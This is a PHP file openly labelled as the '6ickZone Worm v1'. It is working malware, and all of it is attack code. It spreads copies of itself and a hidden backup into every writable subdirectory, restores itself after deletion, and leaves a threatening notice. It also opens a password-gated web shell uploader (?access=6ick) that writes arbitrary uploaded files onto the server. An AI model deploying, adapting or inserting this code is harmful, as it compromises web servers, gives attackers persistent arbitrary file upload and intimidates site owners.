<?php
/*
 * [6ickZone is Worm]
 * This is 6ickZone Worm v1 — Resurrection mechanism is *external*.
 * To enable self-revival after deletion, make sure `guard.php` exists in the same directory.
 * 6ickwhispers@gmail.com
 * by 0x6ick
 */
set_time_limit(0);
ini_set('display_errors', 0);
ini_set('display_startup_errors', 0);
error_reporting(0);

$self        = basename(__FILE__);
$payload     = file_get_contents(__FILE__);
$backupName  = '.syscore.php';
$sigFile     = '.6zsig';
$warning     = "NOTICE:\n\nThis file is monitored.\n\nDeleting it may trigger system lockdown or data corruption.\n\n- 6ickZone";

// Make a backup only if you don't have one already
if (!file_exists(__DIR__ . '/' . $backupName)) {
    copy(__FILE__, __DIR__ . '/' . $backupName);
}

function spread($dir, $payload, $self, $backupName, $sigFile, $warning) {
    $items = scandir($dir);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $path = $dir . '/' . $item;

        if (is_dir($path) && is_writable($path)) {
            $newWorm   = $path . '/' . $self;
            $newBackup = $path . '/' . $backupName;

            if (!file_exists($newWorm)) {
                file_put_contents($newWorm, $payload);
            }

            if (!file_exists($newBackup)) {
                file_put_contents($newBackup, $payload);
            }

            file_put_contents($path . '/' . $sigFile, "6ickZone Marked");
            file_put_contents($path . '/readme_dont_delete.txt', $warning);

            spread($path, $payload, $self, $backupName, $sigFile, $warning);
        }
    }
}

if (!file_exists(__DIR__ . '/' . $self)) {
    $backup = __DIR__ . '/' . $backupName;
    if (file_exists($backup)) {
        copy($backup, __DIR__ . '/' . $self);
    }
}

spread(__DIR__, $payload, $self, $backupName, $sigFile, $warning);

// ===Uploader ?access=6ick ===
if (isset($_GET['access']) && $_GET['access'] === '6ick') {
    echo '<style>body{background:#000;color:#0f0;font-family:monospace}</style>';
    echo "<h3>0x6ick :: Where Creativity, Exploitation, and Expression Collide. </h3>";
    echo '<form method="post" enctype="multipart/form-data">
            <input type="file" name="f">
            <input type="submit" value="Upload">
          </form>';

    if (!empty($_FILES['f'])) {
        $n = basename($_FILES['f']['name']);
        $t = $_FILES['f']['tmp_name'];

        if (move_uploaded_file($t, __DIR__ . '/' . $n)) {
            echo "[+] Uploaded as $n";
        } else {
            echo "[!] Upload failed.";
        }
    }
}
?>
